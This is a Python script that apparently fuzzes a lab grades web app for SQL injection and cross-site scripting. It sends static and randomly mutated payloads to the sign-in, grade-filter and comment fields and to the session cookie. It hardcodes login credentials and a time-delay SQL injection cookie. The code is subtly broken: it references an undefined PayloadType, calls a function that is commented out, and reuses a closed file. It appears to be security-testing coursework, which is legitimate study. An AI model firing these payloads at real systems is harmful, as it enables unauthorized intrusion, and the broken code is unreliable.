#!/usr/bin/env python3
import requests        # for sending/receiving web requests
import sys             # various system routines (exit, access to stdin, stderr, etc.)
import itertools       # simple tools for computing, e.g., the cross-product of lists
import random
from requests.auth import HTTPBasicAuth
import html
import string

class SQLFuzzConfig:
    def __init__(self):
        self.app_root_url = "http://192.168.56.101:3000"
        self.login_endpoint = {
            "url": "/sign_in",
            "param_data": {
                "login": "peter",
                "password": "football"
            }
        }
        self.endpoints = [
            {
                "url": "/grades",
                "method": "GET",
                "require_login": False,
                "param_data": {},
                "cookie_data": {
                    "session": [PayloadType.SQL_STATIC],
                },
            },
            {
                "url": "/grades/3",
                "method": "POST",
                "require_login": True,
                "param_data": {
                    "grade[comment]": [PayloadType.SQL]
                },
                "cookie_data": {"session": [PayloadType.SQL_STATIC]},
            },
            {
                "url": "/grades",
                "method": "GET",
                "require_login": True,
                "param_data": {
                    "lecturer": [PayloadType.SQL],
                },
                "cookie_data": {"session": [PayloadType.SQL_STATIC]},
            },
            {
                "url": "/sign_in",
                "method": "POST",
                "require_login": False,
                "param_data": {
                    "login": [PayloadType.SQL],
                    "password": [PayloadType.SQL_STATIC]
                },
                "cookie_data": {"session": [PayloadType.SQL_STATIC]},
            },
        ]


def SQL_login(f, payloads,params_data, ob, data,dynamic_sql_mutations):
    pays = [payloads, dynamic_sql_mutations]
    static_count = 0
    dynamic_count = 0
    print('\n\n')
    for choice in pays:
        if choice == payloads:
            print("Testing Static SQL Payloads on SignIn page")
        elif choice == dynamic_sql_mutations:
            print("Testing Dynamic SQL Payloads on SignIn page")
        for i in choice:
            params_data["login"] = i
            r = requests.post(ob.app_root_url+data['url'], params=params_data)
            if "We're sorry, but something went wrong." in (r.text) or r.status_code == 500:
                if choice == payloads:
                    static_count += 1
                    #>>>>>>> print('STATIC:>  SQL Vulnerability Found on SignIn page for Payload: ',params_data['login'])
                elif choice == dynamic_sql_mutations:
                    dynamic_count += 1
                    #>>>>>>> print('DYNAMIC:>  SQL Vulnerability Found on SignIn page for Payload: ',params_data['login'])    
    
    f.write("{} {} {} {} ".format('Count of static SQL payloads to which the App\'s login field is vulnerable: ',static_count,'out of Total: ' ,len(payloads)))
    f.write("{} {} {} {} ".format('Count of dynamic SQL payloads to which the App\'s login field is vulnerable: ',dynamic_count,' out of Total: ' ,len(dynamic_sql_mutations)))
    f.write('\n')
    f.close()
    #>>>>>>>>> print('Count of static SQL payloads to which the App is vulnerable: ', static_count, ' out of Total: ', len(payloads))
    #>>>>>>>>> print('Count of dynamic SQL payloads to which the App is vulnerable: ', dynamic_count, ' out of Total: ', len(dynamic_sql_mutations))

def SQL_filter(payloads,params_data, data, ob, data_for_filter, dynamic_sql_mutations):
    
    pays = [payloads, dynamic_sql_mutations]
    static_count = 0
    dynamic_count = 0
    params_data["login"] = 'peter'
    for choice in pays:
        if choice == payloads:
            print("Testing Static SQL Payloads on Filter Grades page")
        elif choice == dynamic_sql_mutations:
            print("Testing Dynamic SQL Payloads on Filter Grades page")
        for i in choice:
            data_for_filter["lecturer"] = i
            with requests.Session() as s:
                p = s.post(ob.app_root_url+data['url'], params=params_data)
                r = s.get(ob.app_root_url+data_for_filter['url'], data=data_for_filter)
                if "We're sorry, but something went wrong." in (r.text) or r.status_code == 500:
                    if choice == payloads:
                        static_count += 1
                        #>>>>>>>print('STATIC:>  SQL Vulnerability Found in Filter Grades for Payload: ',data_for_filter['lecturer'])
                    elif choice == dynamic_sql_mutations:
                        dynamic_count += 1
                        #>>>>>>>print('DYNAMIC:>  SQL Vulnerability Found in Filter Grades for Payload: ',data_for_filter['lecturer'])
                elif "Algebra" in (r.text):
                    if choice == payloads:
                        static_count += 1
                        print(i)
                        #>>>>>>>print('STATIC:>  SQL Vulnerability Found in Filter Grades for Payload: ',data_for_filter['lecturer'])

                    elif choice == dynamic_sql_mutations:
                        dynamic_count += 1
                        #>>>>>>> print('DYNAMIC:>  SQL Vulnerability Found in Filter Grades for Payload: ',data_for_filter['lecturer'])

    f = open("results_summary.txt", "a")
    f.write('\n')
    f.write("{} {} {} {} ".format('Count of static SQL payloads to which the App\'s filter field is vulnerable: ',static_count,' out of Total: ' ,len(payloads)))
    f.write("{} {} {} {} ".format('Count of dynamic SQL payloads to which the App\'s filter field is vulnerable: ',dynamic_count,' out of Total: ' ,len(dynamic_sql_mutations)))
    f.close()
    #>>>>>>>>> print('Count of static SQL payloads to which the App is vulnerable: ', static_count, ' out of Total: ', len(payloads))
    #>>>>>>>>> print('Count of dynamic SQL payloads to which the App is vulnerable: ', dynamic_count, ' out of Total: ', len(dynamic_sql_mutations))

def XSS_comment_box(f,payloads,params_data,data,xss_params_data, ob, xss_data, dynamic_xss_mutations):
    pays = [payloads, dynamic_xss_mutations]
    static_count = 0
    dynamic_count = 0
    
    params_data["login"] = 'peter'
    xss_params_data["grade[comment]"] = 'Hello'    
    # Use 'with' to ensure the session context is closed after use.
    static_xss_vulnerabilities = 0
    dynamic_xss_vulnerabilities = 0
    print('\n\n')
    for choice in pays:
        if choice == payloads:
            print("Testing Static XSS Payloads in Comments Field")
        elif choice == dynamic_xss_mutations:
            print("Testing Dynamic XSS Payloads in Comments Field")
        with requests.Session() as s:
            for i in choice:
                datas = {'_method':'patch','grade[comment]' : i}
                p = s.post(ob.app_root_url+data['url'], params=params_data)
                t = s.post(ob.app_root_url+xss_data['url'], data=datas)
                

# UPDATED CODE
                if i in t.text:
                    if choice == payloads:
                        static_xss_vulnerabilities +=1
                    elif choice == dynamic_xss_mutations:
                        dynamic_xss_vulnerabilities +=1
# ENDs HERE



    f = open("results_summary.txt", "a")
    f.write('\n')
    f.write("{} {} {} {} ".format('Count of static XSS payloads to which the App\'s Comment field is vulnerable: ',static_xss_vulnerabilities,' out of Total: ' ,len(payloads)))
    f.write("{} {} {} {} ".format('Count of dynamic XSS payloads to which the App\'s Comment field is vulnerable: ',dynamic_xss_vulnerabilities,' out of Total: ' ,len(dynamic_xss_mutations)))
    f.close()


# def XSS_filter(payloads,params_data,data,xss_params_data_filter, ob, xss_data_filter, dynamic_xss_mutations):
#     pays = [payloads, dynamic_xss_mutations]
#     static_count = 0
#     dynamic_count = 0

#     # pays = [payloads, dynamic_sql_mutations]
#     params_data["login"] = 'peter'
#     for choice in pays:
#         if choice == payloads:
#             print("Testing Static XSS Payloads on Grades Filter page")
#         elif choice == dynamic_xss_mutations:
#             print("Testing Dynamic XSS Payloads on Grades Filter page")
#         for i in choice:
#             with requests.Session() as s:
#                 xss_params_data_filter["lecturer"] = i
#                 p = s.post(ob.app_root_url+data['url'], params=params_data)
#                 r = s.get(ob.app_root_url+xss_data_filter['url'], params=xss_params_data_filter)
#                 # if "We're sorry, but something went wrong." in (r.text):
#                 #     print('SQL Vulnerability Found in Filter Grades for Payload: ',data_for_filter['lecturer'])
#                 # elif "Algebra" in (r.text):
#                 #     print('SQL Vulnerability Found in Filter Grades for Payload: ',data_for_filter['lecturer']

def dynamic_sql_mutations_generator(seed_input):
    mutated_SQL_payloads = ''
    """Returns s with a random character inserted"""
    pos = random.randint(0, len(seed_input)+100)
    random_character = ''.join([random.choice(string.ascii_letters + string.digits + string.punctuation ) for n in range(12)])
    # print("Inserting", repr(random_character), "at", pos)
    mutated_SQL_payloads = (seed_input[:pos+random.randrange(0, 2000)] + random_character + seed_input[pos:])
    pos = random.randint(0, len(mutated_SQL_payloads) - 1)
    return mutated_SQL_payloads[:pos] + mutated_SQL_payloads[pos + 1:]


def dynamic_xss_mutations_generator(seed_input):
    mutated_XSS_payloads = ''
    """Returns s with a random character inserted"""
    pos = random.randint(0, len(seed_input)+100)
    random_character = ''.join([random.choice(string.ascii_letters + string.digits + string.punctuation ) for n in range(12)])
    # print("Inserting", repr(random_character), "at", pos)
    mutated_XSS_payloads = (seed_input[:pos+random.randrange(0, 2000)] + random_character + seed_input[pos:])
    pos = random.randint(0, len(mutated_XSS_payloads) - 1)
    return mutated_XSS_payloads[:pos] + mutated_XSS_payloads[pos + 1:]


def main():
    
    f = open("results_summary.txt", "w+")
    static_payloads = []
    sqlPayloadsfile = 'sqlpayloads.txt'  
    with open(sqlPayloadsfile) as fp:  
        for line in fp:
            static_payloads.append(line)
        fp.close()
    static_xss_payloads = []
    xssPayloadsfile = 'xsspayloads.txt'  
    with open(xssPayloadsfile) as fp:  
        for line in fp:
            static_xss_payloads.append(line)
        fp.close()

    sql_payloads_keywords = ['admin = \"\') OR 1=1--\'\"','\'', ')', '%', '*', '"))%', '\',NULL', '%20delay%20\'0:0:20\'%20--', ')%20waitfor%2', '%20waitfor', '0:20\'', 'password = 1\' or \'1\' = \'1\'))/*']
    dynamic_sql_mutations = []
    for i in static_payloads:
        for j in range(25):
            if dynamic_sql_mutations_generator(i) in dynamic_sql_mutations:
                pass
            else:
                dynamic_sql_mutations.append(dynamic_sql_mutations_generator(i))
    
    ob = SQLFuzzConfig()
    data = ob.login_endpoint
    data_endpoint = ob.endpoints
    cookie = data_endpoint[0]['cookie_data'] 
    cookie["session"] = ')%20waitfor%20delay%20\'0:0:20\'%20--'
    r = requests.Session().post(ob.app_root_url+data_endpoint[0]['url'], cookies=cookie)
    if "We're sorry, but something went wrong." in (r.text) or r.status_code == 500:
        print('\nBypassed Login and Exploited SQL Vulnerability on ', data_endpoint[0]['url'], ' page, using payload: ', ')%20waitfor%20delay%20\'0:0:20\'%20--')

    params_data = data['param_data']
    SQL_login(f,static_payloads,params_data,ob, data, dynamic_sql_mutations)
    data_for_filter = ob.endpoints[2]
    SQL_filter(static_payloads,params_data, data, ob, data_for_filter, dynamic_sql_mutations)


    xss_payload_keywords = ['<script>']
    dynamic_xss_mutations = []
    for i in static_xss_payloads:
        for j in range(3):
            if dynamic_xss_mutations_generator(i) in dynamic_xss_mutations:
                pass
            else:
                dynamic_xss_mutations.append(dynamic_xss_mutations_generator(i))
    xss_data = ob.endpoints[1]
    xss_params_data = xss_data['param_data']
    XSS_comment_box(f,static_xss_payloads,params_data,data,xss_params_data, ob, xss_data, dynamic_xss_mutations)

    xss_data_filter = ob.endpoints[2]
    xss_params_data_filter = xss_data_filter['param_data']
    XSS_filter(static_xss_payloads, params_data, data, xss_params_data_filter, ob, xss_data_filter, dynamic_xss_mutations)

    print('\n\n')
    print('\t\t\t\t\t >>>>>>>>> RESULTS <<<<<<<<< \n')
    with open('results_summary.txt') as fp:  
        for line in fp:
            print('\n',line)
    fp.close()
    print('\n Results written to file: results_summary.txt')

if __name__== "__main__":
    main()